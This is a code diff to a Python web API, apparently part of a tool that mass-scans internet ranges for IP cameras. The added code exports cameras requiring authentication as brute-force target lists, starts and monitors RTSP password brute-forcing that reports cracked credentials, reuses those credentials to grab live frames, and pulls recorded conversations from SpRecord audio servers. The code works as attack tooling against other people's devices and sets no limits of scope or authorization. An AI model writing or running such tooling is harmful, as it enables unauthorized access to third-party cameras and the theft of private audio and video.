@@ -56,7 +56,7 @@ class CredentialPair(BaseModel):
 
 class ScanRequest(BaseModel):
     targets: str                                     # newline-separated IPs/CIDRs/ranges
-    engine: str = "auto"                             # auto | asyncio | masscan | nmap_syn
+    engine: str = "auto"                             # auto | asyncio | masscan | nmap_syn | staged
     masscan_rate: int = 50000
     concurrency: int = 150
     port_timeout: float = 1.2
@@ -66,6 +66,7 @@ class ScanRequest(BaseModel):
     capture_frames: bool = True
     local_discovery: bool = True
     skip_existing: bool = False
+    use_staged_pipeline: bool = False
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -111,11 +112,12 @@ async def start_scan(req: ScanRequest):
         else None
     )
 
+    chosen_engine = "staged" if (req.use_staged_pipeline or req.engine == "staged") else req.engine
     async def _run():
         await run_v2_scan_pipeline(
             job_id=job_id,
             targets_str=req.targets,
-            engine=req.engine,
+            engine=chosen_engine,
             masscan_rate=req.masscan_rate,
             concurrency=req.concurrency,
             port_timeout=req.port_timeout,
@@ -169,6 +171,7 @@ async def get_results(
     protocol: str = Query(default=""),
     has_preview: bool = Query(default=False),
     verified_only: bool = Query(default=False),
+    auth_status: str = Query(default="all"),
 ):
     """Return stored v2 results from DB."""
     results = storage.get_v2_results(
@@ -177,6 +180,7 @@ async def get_results(
         protocol=protocol,
         has_preview=has_preview,
         verified_only=verified_only,
+        auth_status=auth_status,
     )
     stats = storage.get_v2_stats()
     return JSONResponse(content={
@@ -184,6 +188,43 @@ async def get_results(
         "total": len(results),
         "total_db": stats.get("total", len(results)),
     })
+
+
+@router.get("/export/401")
+@router.get("/results/export-401")
+async def export_401_cameras(format: str = Query(default="txt")):
+    """Export list of cameras requiring authentication (401 Unauthorized)."""
+    cameras_401 = storage.get_v2_results(limit=100000, auth_status="401")
+    if format.lower() == "csv":
+        lines = ["ip,port,brand,model,city"]
+        for c in cameras_401:
+            ip = c.get("ip", "")
+            port = c.get("rtsp_port") or 554
+            brand = (c.get("brand") or "").replace(",", " ")
+            model = (c.get("model") or "").replace(",", " ")
+            city = (c.get("city") or "").replace(",", " ")
+            lines.append(f"{ip},{port},{brand},{model},{city}")
+        content = "\n".join(lines)
+        return Response(
+            content=content,
+            media_type="text/csv",
+            headers={"Content-Disposition": 'attachment; filename="targets_rtsp_401.csv"'},
+        )
+    else:
+        # Default txt format (one ip:port per line, compatible with rtspBrute.py)
+        lines = []
+        for c in cameras_401:
+            ip = c.get("ip", "").strip()
+            if not ip:
+                continue
+            port = c.get("rtsp_port") or 554
+            lines.append(f"{ip}:{port}")
+        content = "\n".join(lines)
+        return Response(
+            content=content,
+            media_type="text/plain",
+            headers={"Content-Disposition": 'attachment; filename="targets_rtsp_401.txt"'},
+        )
 
 
 @router.get("/results/{ip}")
@@ -305,7 +346,10 @@ async def get_stream_preview(
     """Capture and return on-demand live snapshot for any camera stream."""
     from ip2domain.cameras.scanner_v2.stage3_stream import capture_stream_frame, _download_http_snapshot
 
-    creds = {"user": user, "password": password} if user else None
+    res = storage.get_v2_result(ip)
+    selected = next((s for s in (res or {}).get("streams", []) if s.get("url") == stream_url), {})
+    creds = ({"user": user, "password": password} if user else
+             selected.get("credentials") if selected.get("credentials") is not None else (res or {}).get("credentials"))
     
     ok = False
     path = ""
@@ -320,7 +364,7 @@ async def get_stream_preview(
             codec = "JPEG"
 
     if not ok:
-        stream_type = "rtmp" if stream_url.startswith("rtmp://") else ("hls" if ".m3u8" in stream_url else ("mjpeg" if "mjpg" in stream_url.lower() else "rtsp"))
+        stream_type = selected.get("type") or ("rtmp" if stream_url.startswith("rtmp://") else ("hls" if ".m3u8" in stream_url else ("mjpeg" if "mjpg" in stream_url.lower() else "rtsp")))
         ok, path, codec, w, h = await capture_stream_frame(
             stream_url=stream_url,
             stream_type=stream_type,
@@ -337,6 +381,9 @@ async def get_stream_preview(
                 for s in res.get("streams", []):
                     if s.get("url") == stream_url:
                         s["verified"] = True
+                        s["verification_status"] = "verified"
+                        s["auth_required"] = False
+                        s["width"], s["height"] = w, h
                         s["screenshot"] = path
                         s["codec"] = codec
                         s["resolution"] = f"{w}x{h}" if w and h else ""
@@ -346,7 +393,11 @@ async def get_stream_preview(
 
         return FileResponse(str(path), media_type="image/jpeg", headers={"Cache-Control": "private, max-age=5"})
 
-    raise HTTPException(status_code=404, detail="Stream frame unavailable or authentication failed")
+    if res and selected:
+        # Keep other streams intact; this URL failed its latest frame check.
+        selected.update(verified=False, screenshot="", verification_status="failed")
+        storage.save_v2_result(res)
+    raise HTTPException(status_code=404, detail="Stream frame unavailable")
 
 
 @router.post("/resolve_geo")
@@ -394,7 +445,7 @@ async def resolve_all_cameras_geo():
 class BulkCaptureRequest(BaseModel):
     concurrency: int = 2
     only_unverified: bool = True
-    max_streams_per_cam: int = 4
+    max_streams_per_cam: int = 0
     ips: Optional[List[str]] = None
 
 
@@ -405,7 +456,7 @@ async def start_bulk_capture(req: Optional[BulkCaptureRequest] = None):
     from ip2domain.cameras.scanner_v2.bulk_capture import bulk_capture_mgr
     c = req.concurrency if req else 2
     ou = req.only_unverified if req else True
-    ms = req.max_streams_per_cam if req else 4
+    ms = req.max_streams_per_cam if req else 0
     ips = req.ips if req else None
     res = await bulk_capture_mgr.start(
         concurrency=c,
@@ -433,4 +484,120 @@ async def stop_bulk_capture():
     return JSONResponse(content=res)
 
 
+class BruteRequest(BaseModel):
+    targets: Optional[List[str]] = None
+    usernames: Optional[List[str]] = None
+    passwords: Optional[List[str]] = None
+    port: int = 554
+    threads: int = 50
 
+
+@router.post("/bruter/start")
+@router.post("/results/bruter/start")
+async def start_bruter(req: Optional[BruteRequest] = None):
+    """Start RTSP brute-force task against cameras with 401 using rtspBrute.py."""
+    from ip2domain.cameras.scanner_v2.bruter import rtsp_brute_mgr
+    t = req.targets if req else None
+    u = req.usernames if req else None
+    p = req.passwords if req else None
+    port = req.port if req else 554
+    th = req.threads if req else 50
+
+    res = await rtsp_brute_mgr.start(
+        targets=t,
+        usernames=u,
+        passwords=p,
+        port=port,
+        threads=th,
+        storage=storage,
+        capture_dir=_V2_CAPTURE_DIR,
+    )
+    return JSONResponse(content=res)
+
+
+@router.get("/bruter/status")
+@router.get("/results/bruter/status")
+async def get_bruter_status():
+    """Get real-time status, progress, cracked credentials, and logs of rtspBrute."""
+    from ip2domain.cameras.scanner_v2.bruter import rtsp_brute_mgr
+    return JSONResponse(content=rtsp_brute_mgr.get_status())
+
+
+@router.post("/bruter/stop")
+@router.post("/results/bruter/stop")
+async def stop_bruter():
+    """Stop the running RTSP brute-force task."""
+    from ip2domain.cameras.scanner_v2.bruter import rtsp_brute_mgr
+    res = await rtsp_brute_mgr.stop()
+    return JSONResponse(content=res)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SpRecord Audio Server Endpoints
+# ─────────────────────────────────────────────────────────────────────────────
+
+_sprecord_clients: Dict[str, Any] = {}
+
+
+def _get_sprecord_client(ip: str, port: int, user: str = "admin", password: str = ""):
+    key = f"{ip}:{port}"
+    client = _sprecord_clients.get(key)
+    if client is None:
+        from ip2domain.cameras.scanner_v2.protocols.sprecord import SpRecordClient
+        client = SpRecordClient(ip=ip, port=port, user=user, password=password)
+        _sprecord_clients[key] = client
+    else:
+        client.user = user
+        client.password = password
+    return client
+
+
+@router.get("/sprecord/records")
+async def get_sprecord_records(
+    ip: str = Query(..., description="IP address of SpRecord server"),
+    offset: int = Query(0, ge=0, description="Record offset"),
+    limit: int = Query(25, ge=1, le=100, description="Records limit per page"),
+    port: Optional[int] = Query(None, description="Optional port, defaults to camera DB port or 8002"),
+):
+    """Retrieve dynamic conversation records list from SpRecord server with pagination."""
+    cam = storage.get_v2_result(ip)
+    creds = (cam or {}).get("credentials") or {}
+    user = creds.get("user") or "admin"
+    password = creds.get("password") or ""
+    actual_port = port or (cam or {}).get("http_port") or 8002
+
+    client = _get_sprecord_client(ip=ip, port=actual_port, user=user, password=password)
+    records_data = await client.get_records(offset=offset, limit=limit)
+    return JSONResponse(content=records_data)
+
+
+@router.api_route("/sprecord/audio", methods=["GET", "HEAD"])
+async def get_sprecord_audio(
+    request: Request,
+    ip: str = Query(..., description="IP address of SpRecord server"),
+    record_id: int = Query(..., description="Record ID"),
+    download: int = Query(0, description="1 to download as attachment, 0 for inline playback"),
+    port: Optional[int] = Query(None, description="Optional port"),
+):
+    """Proxy audio stream from SpRecord server with session authentication."""
+    cam = storage.get_v2_result(ip)
+    creds = (cam or {}).get("credentials") or {}
+    user = creds.get("user") or "admin"
+    password = creds.get("password") or ""
+    actual_port = port or (cam or {}).get("http_port") or 8002
+
+    client = _get_sprecord_client(ip=ip, port=actual_port, user=user, password=password)
+    content, media_type = await client.get_audio_bytes(record_id)
+    if not content:
+        raise HTTPException(status_code=404, detail="Audio record not found or inaccessible")
+
+    disposition = "attachment" if download else "inline"
+    headers = {
+        "Accept-Ranges": "bytes",
+        "Content-Length": str(len(content)),
+        "Content-Disposition": f'{disposition}; filename="sprecord_{record_id}.mp3"',
+        "Cache-Control": "public, max-age=86400",
+    }
+    if request.method == "HEAD":
+        return Response(content=b"", media_type=media_type or "audio/mpeg", headers=headers)
+    return Response(content=content, media_type=media_type or "audio/mpeg", headers=headers)
